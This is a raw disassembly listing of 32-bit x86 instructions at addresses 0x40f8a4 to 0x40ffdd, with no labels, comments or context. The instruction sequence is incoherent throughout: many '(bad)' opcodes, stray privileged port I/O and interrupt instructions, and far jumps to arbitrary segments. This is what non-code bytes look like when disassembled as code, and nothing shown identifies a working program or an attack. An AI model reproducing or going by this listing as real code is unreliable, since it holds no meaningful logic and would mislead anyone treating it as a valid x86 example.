  40f8a4:	outs   dx,BYTE PTR ds:[esi]
  40f8a5:	aaa    
  40f8a6:	lahf   
  40f8a7:	push   0x1b
  40f8a9:	xchg   BYTE PTR [ecx+0xc9ebf70],cl
  40f8af:	xlat   BYTE PTR ds:[ebx]
  40f8b0:	outs   dx,DWORD PTR ds:[esi]
  40f8b1:	push   eax
  40f8b2:	stos   DWORD PTR es:[edi],eax
  40f8b3:	xor    DWORD PTR [eax-0x32],eax
  40f8b6:	fcmovbe st,st(1)
  40f8b8:	shr    DWORD PTR [ebx+0x5d0494f3],0x9b
  40f8bf:	dec    edx
  40f8c0:	repnz fld DWORD PTR [edi]
  40f8c3:	lock xor ch,BYTE PTR [edx]
  40f8c6:	inc    ebp
  40f8c7:	shr    BYTE PTR [edi+0x4f852e5d],0xec
  40f8ce:	or     DWORD PTR [edx],ebp
  40f8d0:	mov    edx,0xbac77cfe
  40f8d5:	stos   BYTE PTR es:[edi],al
  40f8d6:	inc    esp
  40f8d7:	lea    ecx,[ecx-0x2aac991f]
  40f8dd:	mov    WORD PTR [ebp-0x27fce2b2],es
  40f8e3:	fimul  DWORD PTR [ecx-0x7]
  40f8e6:	je     0x40f8b1
  40f8e8:	ret    
  40f8e9:	aam    0xd
  40f8eb:	push   ss
  40f8ec:	xor    eax,0x53c1223c
  40f8f1:	mov    ebx,0x2f7b16c6
  40f8f6:	lahf   
  40f8f7:	scas   eax,DWORD PTR es:[edi]
  40f8f8:	adc    al,BYTE PTR [esi-0x3acbb485]
  40f8fe:	pop    DWORD PTR [edi+0x19]
  40f901:	jb     0x40f8da
  40f903:	add    DWORD PTR [esi-0x28],ecx
  40f906:	ja     0x40f89e
  40f908:	or     edx,eax
  40f90a:	cmp    eax,0xb4429145
  40f90f:	sbb    eax,0x2d9acf7d
  40f914:	mov    dh,dh
  40f916:	in     ax,0xe4
  40f919:	xchg   esi,eax
  40f91a:	inc    edx
  40f91b:	inc    edi
  40f91c:	fist   DWORD PTR [eax-0x5dcc3957]
  40f922:	inc    ebx
  40f923:	pop    esi
  40f924:	inc    esp
  40f925:	in     al,dx
  40f926:	pushf  
  40f927:	and    al,0x1
  40f929:	mov    dl,0xe9
  40f92b:	jbe    0x40f905
  40f92d:	jns    0x40f8bc
  40f92f:	scas   al,BYTE PTR es:[edi]
  40f930:	inc    edi
  40f931:	sbb    dh,BYTE PTR [ebx]
  40f933:	les    ebx,FWORD PTR [esp+edi*8+0x59]
  40f937:	inc    ebp
  40f938:	sub    DWORD PTR [ebp-0x307735c0],ebp
  40f93e:	xchg   esi,ebx
  40f940:	add    ch,BYTE PTR [edi]
  40f942:	xchg   esp,eax
  40f943:	shr    edx,0x4f
  40f946:	mov    DWORD PTR [esp+edi*4],esi
  40f949:	cmp    esi,DWORD PTR [ebx]
  40f94b:	retf   
  40f94c:	in     al,dx
  40f94d:	xchg   edi,eax
  40f94e:	stos   BYTE PTR es:[edi],al
  40f94f:	repnz xchg esi,eax
  40f951:	loopne 0x40f953
  40f953:	jbe    0x40f8e0
  40f955:	fs ret 
  40f957:	push   ds
  40f958:	aaa    
  40f959:	cmovb  edx,DWORD PTR [edi+0x3800069a]
  40f960:	mov    ds:0x18211903,eax
  40f965:	xor    esi,DWORD PTR [edi-0x6d]
  40f968:	or     al,dl
  40f96a:	mov    DWORD PTR [edx+edx*2],esp
  40f96d:	in     al,dx
  40f96e:	xor    eax,0xd7b549fe
  40f973:	out    dx,al
  40f974:	mov    ecx,0x14fd908b
  40f979:	push   0x2e
  40f97b:	adc    DWORD PTR [eax],0xb7ede8a0
  40f981:	add    cl,BYTE PTR [eax-0x70]
  40f984:	xor    al,0xfa
  40f986:	mov    dl,0x41
  40f988:	jbe    0x40f9ee
  40f98a:	pusha  
  40f98b:	dec    esi
  40f98c:	adc    edx,ebx
  40f98e:	bound  esi,QWORD PTR [ecx]
  40f990:	test   BYTE PTR [ecx+0x344c349c],ah
  40f996:	pop    esp
  40f997:	sub    DWORD PTR [eax-0x7fa9f20d],ebp
  40f99d:	repz loope 0x40f9a4
  40f9a0:	inc    ebx
  40f9a1:	jp     0x40f928
  40f9a3:	pop    eax
  40f9a4:	push   DWORD PTR [ebx+0x67]
  40f9a7:	xchg   edx,eax
  40f9a8:	pop    edi
  40f9a9:	mov    cl,0xd3
  40f9ab:	sub    al,0x5a
  40f9ad:	add    al,0xda
  40f9af:	aaa    
  40f9b0:	sbb    eax,0xf5e2d749
  40f9b5:	xchg   ebp,eax
  40f9b6:	in     eax,dx
  40f9b7:	cmp    DWORD PTR [esi],esi
  40f9b9:	cmp    BYTE PTR [ebp+0x1e844c62],dh
  40f9bf:	mov    eax,ds:0xfac2e598
  40f9c4:	into   
  40f9c5:	push   edi
  40f9c6:	mov    esp,0x6c1ebc13
  40f9cb:	repnz imul BYTE PTR [esi+0x7c4f168d]
  40f9d2:	in     al,0x8c
  40f9d4:	cmp    DWORD PTR [ecx+0x31],ebp
  40f9d7:	jb     0x40f981
  40f9d9:	mov    ebx,gs
  40f9db:	cs xchg ebp,eax
  40f9dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9de:	pop    edi
  40f9df:	xor    al,0xf
  40f9e1:	cli    
  40f9e2:	jp     0x40fa2f
  40f9e4:	cmp    al,0xba
  40f9e6:	inc    ecx
  40f9e7:	stc    
  40f9e8:	xchg   edi,eax
  40f9e9:	sti    
  40f9ea:	int    0xa4
  40f9ec:	aaa    
  40f9ed:	retf   
  40f9ee:	mov    al,0xa1
  40f9f0:	mov    WORD PTR ds:0x88029410,gs
  40f9f6:	push   cs
  40f9f7:	outs   dx,DWORD PTR ds:[esi]
  40f9f8:	dec    esp
  40f9f9:	and    cl,cl
  40f9fb:	pushf  
  40f9fc:	and    BYTE PTR [ebx+0x4eb69a94],dh
  40fa02:	pop    ebp
  40fa03:	mov    edi,0x6451c0c3
  40fa08:	std    
  40fa09:	adc    BYTE PTR [esi+0x7f],al
  40fa0c:	sbb    BYTE PTR [ebp+edx*1-0x2b4d686b],dl
  40fa13:	lods   eax,DWORD PTR ds:[esi]
  40fa14:	mov    al,0xda
  40fa16:	mov    ch,0xb4
  40fa18:	mov    ecx,0xd2c33b03
  40fa1d:	fst    st(6)
  40fa1f:	xor    edi,DWORD PTR [esi]
  40fa21:	xor    DWORD PTR [eax],ebx
  40fa23:	int    0xe6
  40fa25:	or     al,0x4f
  40fa27:	stos   BYTE PTR es:[edi],al
  40fa28:	popf   
  40fa29:	mov    BYTE PTR [ecx+eiz*8+0x6de62e0c],0xa1
  40fa31:	jo     0x40fa10
  40fa33:	lahf   
  40fa34:	cli    
  40fa35:	daa    
  40fa36:	rol    BYTE PTR [ebx+0x5e92e215],0xea
  40fa3d:	mov    ds:0x6d23a0ec,eax
  40fa42:	pop    ds
  40fa43:	cmc    
  40fa44:	popa   
  40fa45:	imul   BYTE PTR [ecx-0x8]
  40fa48:	(bad)  
  40fa49:	in     al,0x9c
  40fa4b:	lahf   
  40fa4c:	loope  0x40faba
  40fa4e:	enter  0x5720,0x5c
  40fa52:	fcom   QWORD PTR [ebx+0x56]
  40fa55:	enter  0x66a1,0x88
  40fa59:	sub    edx,DWORD PTR [ebx-0x1013d395]
  40fa5f:	fcomp  DWORD PTR [eax-0x59]
  40fa62:	mov    edi,0xe001d47a
  40fa67:	scas   al,BYTE PTR es:[edi]
  40fa68:	(bad)  
  40fa69:	outs   dx,BYTE PTR ds:[si]
  40fa6b:	or     BYTE PTR [eax-0x34],0x78
  40fa6f:	push   es
  40fa70:	fimul  WORD PTR ds:0x58d758e4
  40fa76:	adc    BYTE PTR [edx-0x7a66d47],ah
  40fa7c:	mov    ch,0xa8
  40fa7e:	ja     0x40fae0
  40fa80:	add    al,al
  40fa82:	imul   edx,DWORD PTR [ebp+0x57],0x5188d078
  40fa89:	aaa    
  40fa8a:	call   0x175bce3e
  40fa8f:	add    al,dh
  40fa91:	ja     0x40fa3c
  40fa93:	inc    esi
  40fa94:	add    al,0x85
  40fa96:	mov    al,ds:0x967536d4
  40fa9b:	jmp    0x19f5d405
  40faa0:	xor    ebp,eax
  40faa2:	sub    eax,0xd4ad707c
  40faa7:	sub    al,0x24
  40faa9:	pushf  
  40faaa:	jecxz  0x40fb2b
  40faac:	cli    
  40faad:	xchg   ecx,eax
  40faae:	adc    edx,DWORD PTR [edx+0x1fcabbde]
  40fab4:	shl    DWORD PTR [eax+ebx*8],cl
  40fab7:	xchg   ebx,eax
  40fab8:	add    ebx,DWORD PTR [edx+0x53]
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	or     bh,cl
  40fabe:	xor    al,0x80
  40fac0:	pushf  
  40fac1:	inc    ecx
  40fac2:	mov    esp,0x27b8ebc4
  40fac7:	cmp    DWORD PTR [edx-0x5f617188],esi
  40facd:	mov    ah,0x8f
  40facf:	loop   0x40fac6
  40fad1:	(bad)  
  40fad2:	shr    DWORD PTR [esi+0x32cc44c8],1
  40fad8:	xchg   edx,eax
  40fad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fada:	sahf   
  40fadb:	lods   al,BYTE PTR ds:[esi]
  40fadc:	cmp    BYTE PTR [edi],bl
  40fade:	lds    ebp,FWORD PTR [esi+ecx*1-0x723e593b]
  40fae5:	cmc    
  40fae6:	cmp    eax,DWORD PTR [ecx]
  40fae8:	sub    ebp,edx
  40faea:	cmp    dl,BYTE PTR [esi+0x1d172e86]
  40faf0:	ss sti 
  40faf2:	push   cs
  40faf3:	xchg   DWORD PTR [esi+0x47e8b462],edi
  40faf9:	clc    
  40fafa:	shr    DWORD PTR [eax+0x7e],1
  40fafd:	pop    esi
  40fafe:	xchg   ecx,eax
  40faff:	mov    ecx,0xab405518
  40fb04:	pusha  
  40fb05:	lahf   
  40fb06:	js     0x40fb58
  40fb08:	mov    dl,BYTE PTR [eax-0x4c161cc1]
  40fb0e:	jno    0x40faba
  40fb10:	cli    
  40fb11:	add    ebx,ecx
  40fb13:	aas    
  40fb14:	jmp    0xe8cc125
  40fb19:	shl    DWORD PTR [ebx+0x37],1
  40fb1c:	out    0x2e,eax
  40fb1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb1f:	lods   eax,DWORD PTR ds:[esi]
  40fb20:	jg     0x40fb24
  40fb22:	int    0x9f
  40fb24:	(bad)  
  40fb25:	mov    ecx,0xf3fddab7
  40fb2a:	mov    esp,edx
  40fb2c:	jmp    0x66e3:0x190121f6
  40fb33:	xlat   BYTE PTR ds:[ebx]
  40fb34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb35:	nop
  40fb36:	js     0x40fae1
  40fb38:	jb     0x40faf3
  40fb3a:	xchg   ebx,eax
  40fb3b:	ss out dx,al
  40fb3d:	push   0xb2730541
  40fb42:	lods   eax,DWORD PTR ds:[esi]
  40fb43:	ret    
  40fb44:	fwait
  40fb45:	and    dh,BYTE PTR [eax]
  40fb47:	fs jp  0x40fb0e
  40fb4a:	push   0x90d288bd
  40fb4f:	push   cs
  40fb50:	inc    ebp
  40fb51:	jne    0x40fad5
  40fb53:	xor    DWORD PTR [esi-0x6770379d],ebx
  40fb59:	pop    eax
  40fb5a:	cs loope 0x40fb19
  40fb5d:	out    0xca,al
  40fb5f:	and    ah,BYTE PTR [ecx]
  40fb61:	das    
  40fb62:	call   0x2ab119f4
  40fb67:	in     eax,0xfd
  40fb69:	pop    ebx
  40fb6b:	mov    ah,BYTE PTR [esi]
  40fb6d:	push   esi
  40fb6e:	xchg   BYTE PTR [eax-0x7a],al
  40fb71:	pusha  
  40fb72:	cmc    
  40fb73:	push   ds
  40fb74:	lock push ecx
  40fb76:	fwait
  40fb77:	pop    es
  40fb78:	rol    BYTE PTR ds:0xe5ff2c69,0x84
  40fb7f:	lock out dx,eax
  40fb81:	sub    esi,0xb34fda11
  40fb87:	ja     0x40fbbc
  40fb89:	clc    
  40fb8a:	icebp  
  40fb8b:	cmc    
  40fb8c:	div    BYTE PTR ss:[edi-0x2c878d0d]
  40fb93:	hlt    
  40fb94:	lods   eax,DWORD PTR ds:[esi]
  40fb95:	(bad)  
  40fb96:	icebp  
  40fb97:	(bad)
  40fb9a:	push   ecx
  40fb9b:	dec    esi
  40fb9c:	and    al,0xc2
  40fb9e:	ret    
  40fb9f:	lock cmc 
  40fba1:	into   
  40fba2:	pop    edx
  40fba3:	js     0x40fb3f
  40fba5:	jecxz  0x40fbc4
  40fba7:	stos   DWORD PTR es:[edi],eax
  40fba8:	jmp    0x40fb2c
  40fbaa:	aas    
  40fbab:	clc    
  40fbac:	cmp    bl,BYTE PTR [edx-0x6cbac1c7]
  40fbb2:	das    
  40fbb3:	mov    eax,0xe1cea75e
  40fbb8:	mov    dl,0x43
  40fbba:	mov    ch,BYTE PTR [edi+eax*4]
  40fbbd:	icebp  
  40fbbe:	pop    esp
  40fbbf:	adc    al,0xa8
  40fbc1:	int3   
  40fbc2:	push   0xffffffa9
  40fbc4:	xchg   edi,eax
  40fbc5:	fdivr  DWORD PTR [edi+0x62d20c4b]
  40fbcb:	jbe    0x40fb6c
  40fbcd:	shr    ebx,0x6c
  40fbd0:	(bad)  
  40fbd1:	mov    eax,0xf6f9e8e9
  40fbd6:	inc    esi
  40fbd7:	gs (bad) 
  40fbd9:	stc    
  40fbda:	or     edi,DWORD PTR [ebp-0x61]
  40fbdd:	test   DWORD PTR [esi+0x31],esp
  40fbe0:	mov    cl,0x7f
  40fbe2:	and    BYTE PTR [ebx+eiz*2-0x7445faa5],bh
  40fbe9:	cwde   
  40fbea:	dec    edx
  40fbeb:	add    BYTE PTR [ecx-0x1dde98c4],al
  40fbf1:	jnp    0x40fb8a
  40fbf3:	fisubr DWORD PTR [eax]
  40fbf5:	jmp    0x40fc4a
  40fbf7:	icebp  
  40fbf8:	push   ebp
  40fbf9:	scas   eax,DWORD PTR es:[edi]
  40fbfa:	lds    ebx,FWORD PTR [esi]
  40fbfc:	jle    0x40fb84
  40fbfe:	xlat   BYTE PTR ds:[ebx]
  40fbff:	inc    edx
  40fc00:	sub    dl,dh
  40fc02:	xor    eax,0xc293f72a
  40fc07:	std    
  40fc08:	sub    al,0x5
  40fc0a:	(bad)  
  40fc0b:	push   esi
  40fc0c:	lods   eax,DWORD PTR ds:[esi]
  40fc0d:	push   0x43
  40fc0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc10:	pop    edx
  40fc11:	cmp    eax,0x7ddea07c
  40fc16:	push   ds
  40fc17:	and    al,0x40
  40fc19:	sbb    DWORD PTR [ebx-0x615bbabe],ebp
  40fc1f:	popa   
  40fc20:	js     0x40fc65
  40fc22:	stos   DWORD PTR es:[edi],eax
  40fc23:	fistp  WORD PTR [ebx-0x72dcf83f]
  40fc29:	inc    eax
  40fc2a:	xor    dl,dh
  40fc2c:	test   ah,bl
  40fc2e:	xor    BYTE PTR ds:0x44908279,0xcb
  40fc35:	pop    ds
  40fc36:	sbb    al,0xe0
  40fc38:	add    DWORD PTR [eax],ebp
  40fc3a:	mov    BYTE PTR [ecx+0x4b97d7e3],0xfa
  40fc41:	adc    DWORD PTR [ebp+0x3d8b4c12],edi
  40fc47:	(bad)  
  40fc48:	or     DWORD PTR [edx-0x77de0174],ecx
  40fc4e:	cmp    al,0xbd
  40fc50:	push   0xc03ac2e9
  40fc55:	push   ebx
  40fc56:	in     al,0x64
  40fc58:	mov    ebx,DWORD PTR [ebx+0xb]
  40fc5b:	es dec esp
  40fc5d:	retf   
  40fc5e:	ret    
  40fc5f:	sar    DWORD PTR [ecx],cl
  40fc61:	and    DWORD PTR [edx+0x4f],esi
  40fc64:	and    BYTE PTR [edi-0x35],dl
  40fc67:	push   esp
  40fc68:	mov    esp,0x4341c872
  40fc6d:	mov    bh,0x5
  40fc6f:	cmp    al,0x9c
  40fc71:	cld    
  40fc72:	sbb    DWORD PTR [ebx],edi
  40fc74:	mov    ebx,0xd19b35bd
  40fc79:	cmp    DWORD PTR [ebx+eax*8-0x74],ebx
  40fc7d:	jo     0x40fc11
  40fc7f:	cmove  ecx,DWORD PTR [esi-0xc]
  40fc83:	add    BYTE PTR [ebx],cl
  40fc85:	xor    esi,DWORD PTR [ecx-0x7a]
  40fc88:	pop    ds
  40fc89:	dec    ebp
  40fc8a:	ins    DWORD PTR es:[edi],dx
  40fc8b:	or     eax,0xe4c3e8a1
  40fc90:	push   es
  40fc91:	ja     0x40fcf3
  40fc93:	sub    eax,0xaa7f2b9e
  40fc98:	lods   eax,DWORD PTR ds:[esi]
  40fc99:	aam    0xd7
  40fc9b:	jne    0x40fc5d
  40fc9d:	loop   0x40fc4e
  40fc9f:	and    ecx,esp
  40fca1:	pop    ss
  40fca2:	sub    DWORD PTR [ebx-0x2a],esi
  40fca5:	mov    bh,dh
  40fca7:	into   
  40fca8:	jp     0x40fc8f
  40fcaa:	outs   dx,BYTE PTR ds:[esi]
  40fcab:	push   ecx
  40fcac:	dec    esp
  40fcad:	inc    ebx
  40fcae:	inc    edx
  40fcaf:	rcl    DWORD PTR [ebp+0x7],0xae
  40fcb3:	mov    cl,0x6
  40fcb5:	push   cs
  40fcb6:	in     eax,0x37
  40fcb8:	test   DWORD PTR [ebp-0x248629c5],edi
  40fcbe:	cmp    BYTE PTR [ebp+0x1d],bh
  40fcc1:	xchg   edi,eax
  40fcc2:	push   ebp
  40fcc3:	dec    esi
  40fcc4:	xchg   edx,eax
  40fcc5:	xor    edi,DWORD PTR [edi-0x43]
  40fcc8:	cld    
  40fcc9:	ja     0x40fc6d
  40fccb:	push   ebp
  40fccc:	jns    0x40fd2b
  40fcce:	mov    ebx,0xa1ca006a
  40fcd3:	mov    esp,0xa0883880
  40fcd8:	test   BYTE PTR [eax-0xaef9157],ch
  40fcde:	sbb    al,0x7b
  40fce0:	out    0x37,eax
  40fce2:	imul   esi,DWORD PTR [eax],0xffffff98
  40fce5:	or     al,0xf5
  40fce7:	out    dx,al
  40fce8:	lea    esi,[esi-0x51]
  40fceb:	sub    bh,BYTE PTR [edx-0x6790d9c6]
  40fcf1:	mov    bh,0x11
  40fcf3:	pop    esp
  40fcf4:	xlat   BYTE PTR ds:[ebx]
  40fcf5:	sbb    eax,0x74f48420
  40fcfa:	xor    al,0xbb
  40fcfc:	clc    
  40fcfd:	sub    al,0xc2
  40fcff:	sbb    al,0x48
  40fd01:	cmp    DWORD PTR [ecx+0x46],ecx
  40fd04:	inc    ebx
  40fd05:	or     DWORD PTR [edi+0x36],ecx
  40fd08:	pop    eax
  40fd09:	test   ebx,eax
  40fd0b:	sbb    BYTE PTR [esi],ah
  40fd0d:	out    0xfc,al
  40fd0f:	pop    ds
  40fd10:	xor    bl,ah
  40fd12:	pop    edi
  40fd13:	call   0xf794:0x5f071305
  40fd1a:	ins    BYTE PTR es:[edi],dx
  40fd1b:	cdq    
  40fd1c:	inc    ecx
  40fd1d:	push   esp
  40fd1e:	xchg   ebp,eax
  40fd1f:	ror    ebp,0x39
  40fd22:	xchg   DWORD PTR [ebx+0x6dffab6d],edi
  40fd28:	xor    eax,DWORD PTR [ebp+0x7c]
  40fd2b:	dec    edx
  40fd2c:	inc    edx
  40fd2d:	and    al,0xde
  40fd2f:	pop    ds
  40fd30:	pop    ebp
  40fd31:	jae    0x40fce2
  40fd33:	jl     0x40fd66
  40fd35:	push   ss
  40fd36:	jbe    0x40fd75
  40fd38:	jmp    0xef0a:0xbebad6a5
  40fd3f:	pop    eax
  40fd40:	sbb    al,0x32
  40fd42:	(bad)  
  40fd44:	mov    bl,0x8b
  40fd46:	mov    ds:0x59e15dd6,al
  40fd4b:	pop    ebx
  40fd4c:	repz out 0x22,eax
  40fd4f:	jbe    0x40fd3d
  40fd51:	int    0x20
  40fd53:	js     0x40fd3d
  40fd55:	or     DWORD PTR [ecx-0x2ffd637c],0xffffff8e
  40fd5c:	mov    ecx,0xe0441385
  40fd61:	in     eax,0xd
  40fd63:	mov    WORD PTR [edi+0x382c3597],ss
  40fd69:	sti    
  40fd6a:	or     esi,DWORD PTR [ecx+ebp*2-0x33]
  40fd6e:	test   al,0x90
  40fd70:	pusha  
  40fd71:	pop    eax
  40fd72:	xchg   esi,eax
  40fd73:	mov    ebp,0xcc9fc0f8
  40fd78:	sbb    eax,0xa44c7c2b
  40fd7d:	jecxz  0x40fdee
  40fd7f:	orps   xmm0,XMMWORD PTR [eax+edi*8-0x2]
  40fd84:	jl     0x40fdef
  40fd86:	add    eax,0x2b9d0f0e
  40fd8b:	aad    0xe5
  40fd8d:	mov    dh,0x87
  40fd8f:	xchg   DWORD PTR [edx+ebx*4-0x5],ebp
  40fd93:	cmp    eax,DWORD PTR [edx]
  40fd95:	cli    
  40fd96:	push   ebp
  40fd97:	sbb    bl,BYTE PTR [edi+0x5f4866bb]
  40fd9d:	sub    DWORD PTR [eax+0x39d350eb],0x7c
  40fda4:	clc    
  40fda5:	out    0x83,eax
  40fda7:	add    BYTE PTR [ecx+0x23],bl
  40fdaa:	fs cli 
  40fdac:	adc    BYTE PTR [esi+edi*8-0x57852bc3],ah
  40fdb3:	lahf   
  40fdb4:	(bad)  
  40fdb5:	mov    al,ds:0x3610878a
  40fdba:	test   al,0xb7
  40fdbc:	in     al,dx
  40fdbd:	push   ebx
  40fdbe:	mov    BYTE PTR [edi-0x62],0xe
  40fdc2:	jl     0x40fdac
  40fdc4:	push   es
  40fdc5:	inc    edx
  40fdc6:	idiv   BYTE PTR [eax+0x60]
  40fdc9:	push   es
  40fdca:	dec    esp
  40fdcb:	cwde   
  40fdcc:	(bad)  
  40fdcd:	pop    eax
  40fdce:	loopne 0x40fdde
  40fdd0:	mov    dh,0xb4
  40fdd2:	iret   
  40fdd3:	and    eax,0x5b031d7c
  40fdd8:	mov    ebx,esi
  40fdda:	dec    ecx
  40fddb:	mov    edx,0x2a27affa
  40fde0:	and    eax,0x1fabffc1
  40fde5:	inc    ebx
  40fde6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fde7:	fbstp  TBYTE PTR [edx-0x5e99872e]
  40fded:	adc    DWORD PTR [esp+ebx*4],eax
  40fdf0:	xchg   esp,eax
  40fdf1:	inc    edi
  40fdf2:	mov    ch,al
  40fdf4:	ret    
  40fdf5:	jne    0x40fd87
  40fdf7:	popf   
  40fdf8:	mov    ebx,0xefffba31
  40fdfd:	mov    eax,0x7e2b76a9
  40fe02:	es js  0x40fe4e
  40fe05:	cmp    cl,ah
  40fe07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe08:	lahf   
  40fe09:	inc    esp
  40fe0a:	aam    0xae
  40fe0c:	xor    DWORD PTR [esi],edx
  40fe0e:	pushf  
  40fe0f:	jmp    0xa188221e
  40fe14:	push   0xffffffe9
  40fe16:	in     al,dx
  40fe17:	lock xchg BYTE PTR [esi],bh
  40fe1a:	add    cl,0x7c
  40fe1d:	mov    eax,ds:0x426b54bf
  40fe22:	outs   dx,DWORD PTR fs:[esi]
  40fe24:	sbb    ch,BYTE PTR [esi+0x3a]
  40fe27:	mov    edx,0xa4d13c03
  40fe2c:	sahf   
  40fe2d:	sub    ch,ch
  40fe2f:	push   0x1ebe29cb
  40fe34:	push   ss
  40fe35:	mov    ah,0x55
  40fe37:	inc    ebx
  40fe38:	jmp    0x2854:0x6840fd49
  40fe3f:	jl     0x40fde5
  40fe41:	push   ebx
  40fe42:	fldcw  WORD PTR [ebp+0x6f]
  40fe45:	dec    edi
  40fe46:	inc    ebx
  40fe47:	scas   eax,DWORD PTR es:[edi]
  40fe48:	mov    bl,BYTE PTR [esi-0x67]
  40fe4b:	ins    BYTE PTR es:[edi],dx
  40fe4c:	test   al,0xf5
  40fe4e:	aaa    
  40fe4f:	and    ch,BYTE PTR [ebx+0x5de99695]
  40fe55:	leave  
  40fe56:	push   esi
  40fe57:	and    DWORD PTR [eax],eax
  40fe59:	dec    edi
  40fe5a:	mov    dl,0x1c
  40fe5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe5d:	scas   eax,DWORD PTR es:[edi]
  40fe5e:	jg     0x40fea3
  40fe60:	gs mov ebx,0xbdeaaa92
  40fe66:	outs   dx,DWORD PTR ds:[esi]
  40fe67:	(bad)  
  40fe68:	push   edi
  40fe69:	test   DWORD PTR [ecx+0x589ace47],esi
  40fe6f:	mov    esp,ss
  40fe71:	lock or eax,0x14f69bda
  40fe77:	std    
  40fe78:	cmp    BYTE PTR [eax],dl
  40fe7a:	mov    edi,0xd4752184
  40fe7f:	div    BYTE PTR [eax+0x13]
  40fe82:	enter  0xd5d8,0xd2
  40fe86:	sbb    al,0xac
  40fe88:	imul   eax,edx,0x3b
  40fe8b:	cwde   
  40fe8c:	fdivr  QWORD PTR ds:0x1f1dde14
  40fe92:	mov    dl,0x79
  40fe94:	mov    edi,0x4725c70b
  40fe99:	rcr    BYTE PTR [ebp-0x7c4fd737],0xaa
  40fea0:	(bad)
  40fea3:	idiv   bh
  40fea5:	pop    edx
  40fea6:	adc    eax,0xa3ba3a7
  40feab:	mov    al,0xb5
  40fead:	(bad)  
  40feaf:	ss inc eax
  40feb1:	push   esi
  40feb2:	mov    ds:0x8e1157c,al
  40feb7:	mov    BYTE PTR [ecx+0x73a24e0],dl
  40febd:	and    eax,0xb87c1af4
  40fec2:	mov    eax,ds:0x5b4b13e1
  40fec7:	pop    es
  40fec8:	js     0x40fee9
  40feca:	xchg   ecx,eax
  40fecb:	xchg   edi,eax
  40fecc:	repnz cmc 
  40fece:	(bad)  
  40fed0:	(bad)  
  40fed1:	fcom   QWORD PTR [ebp-0x46]
  40fed4:	dec    esi
  40fed5:	mov    ds:0x6223ccb1,eax
  40feda:	jns    0x40fee0
  40fedc:	(bad)  
  40fedd:	leave  
  40fede:	test   al,0xea
  40fee0:	inc    eax
  40fee1:	mov    cl,0x32
  40fee3:	jmp    0x1a7d23a
  40fee8:	mov    edx,ss
  40feea:	or     esp,DWORD PTR [edx+ebx*1-0x14]
  40feee:	rcl    BYTE PTR [eax+edx*4],cl
  40fef1:	icebp  
  40fef2:	mov    WORD PTR [ebx],?
  40fef4:	repz mov ebx,0x9cbf36c4
  40fefa:	int3   
  40fefb:	jecxz  0x40fee3
  40fefd:	repnz mov esp,0x6694669c
  40ff03:	data16 add al,0xa8
  40ff06:	repz xor eax,eax
  40ff09:	lods   eax,DWORD PTR ds:[esi]
  40ff0a:	sbb    BYTE PTR [esi-0x71],dh
  40ff0d:	mov    WORD PTR [eax],gs
  40ff0f:	imul   ebx,DWORD PTR [edx],0x65
  40ff12:	cmp    esi,DWORD PTR [eax+esi*2-0x76524c78]
  40ff19:	idiv   BYTE PTR [edi+0x857554b]
  40ff1f:	add    eax,0x354f2e9b
  40ff24:	pop    ebx
  40ff25:	dec    ebx
  40ff26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff27:	in     eax,dx
  40ff28:	xchg   ebx,eax
  40ff29:	dec    ecx
  40ff2a:	inc    esi
  40ff2b:	and    edx,ebx
  40ff2d:	add    esp,DWORD PTR [esi]
  40ff2f:	mov    eax,ds:0xb03a811b
  40ff34:	leave  
  40ff35:	repnz push 0x2ceb3369
  40ff3b:	aad    0x28
  40ff3d:	mov    dl,0x22
  40ff3f:	scas   al,BYTE PTR es:[edi]
  40ff40:	push   ds
  40ff41:	mov    WORD PTR [ebx+ebx*1-0x24],ds
  40ff45:	sbb    DWORD PTR [edi-0x41df4681],edx
  40ff4b:	jmp    0xfba1beca
  40ff50:	or     DWORD PTR [eax-0x35],esi
  40ff53:	scas   al,BYTE PTR es:[edi]
  40ff54:	sbb    BYTE PTR [esi+edi*2-0x2b],0x2
  40ff59:	and    edi,DWORD PTR [edi-0x726f207c]
  40ff5f:	(bad)  
  40ff60:	jno    0x40ff18
  40ff62:	rol    DWORD PTR [esi+edi*1+0x5f80c4ae],1
  40ff69:	js     0x40ff94
  40ff6b:	bound  edi,QWORD PTR [edx-0x13]
  40ff6e:	cmp    ebx,ecx
  40ff70:	mov    ah,0xa4
  40ff72:	mov    DWORD PTR [esi+0x4e701fc3],edi
  40ff78:	mov    ecx,DWORD PTR [edx]
  40ff7a:	mov    ebp,0xb7d89ceb
  40ff7f:	add    edi,DWORD PTR [edx+eax*2+0x1c81ff35]
  40ff86:	outs   dx,BYTE PTR ds:[esi]
  40ff87:	pop    ds
  40ff88:	nop
  40ff89:	sbb    BYTE PTR [ecx],0xfd
  40ff8c:	push   ecx
  40ff8d:	push   ebx
  40ff8e:	lahf   
  40ff8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff90:	sub    ecx,ecx
  40ff92:	push   ss
  40ff93:	imul   ebp,DWORD PTR [eax+eiz*4],0x6e406f0a
  40ff9a:	or     eax,0xd901c902
  40ff9f:	out    dx,eax
  40ffa0:	cmp    esp,eax
  40ffa2:	int3   
  40ffa3:	push   edi
  40ffa4:	mov    edx,0xe2366e2a
  40ffa9:	sbb    BYTE PTR [ebp-0x43],ch
  40ffac:	inc    esi
  40ffad:	inc    eax
  40ffae:	xchg   esi,eax
  40ffaf:	mov    al,ds:0xe3acd418
  40ffb4:	pop    ebp
  40ffb5:	int    0xb6
  40ffb7:	jecxz  0x40ff72
  40ffb9:	jle    0x40ff8b
  40ffbb:	xchg   esp,eax
  40ffbc:	fmul   DWORD PTR [ecx+0x60]
  40ffbf:	ret    0x862a
  40ffc2:	enter  0x3400,0x24
  40ffc6:	(bad)  
  40ffc7:	and    ch,BYTE PTR [edx-0x1803eee7]
  40ffcd:	xchg   BYTE PTR [esi+0x68921ae],ah
  40ffd3:	mov    ds:0xab9e4769,eax
  40ffd8:	repnz das 
  40ffda:	pop    esi
  40ffdb:	jle    0x410013
  40ffdd:	jmp    0x246d3290
